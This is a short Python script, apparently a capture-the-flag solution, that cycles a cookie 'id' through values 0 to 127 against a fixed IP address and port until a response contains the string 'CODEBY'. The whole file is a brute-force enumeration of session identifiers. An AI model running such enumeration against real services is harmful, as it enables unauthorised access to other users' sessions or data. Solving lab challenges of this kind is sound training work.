import requests

cookies = dict()
for i in range(128):
	cookies["id"] = str(i)
	resp = requests.get("http://62.173.140.174:16003/", cookies=cookies)
	print(resp.text)
	if "CODEBY" in resp.text:
		break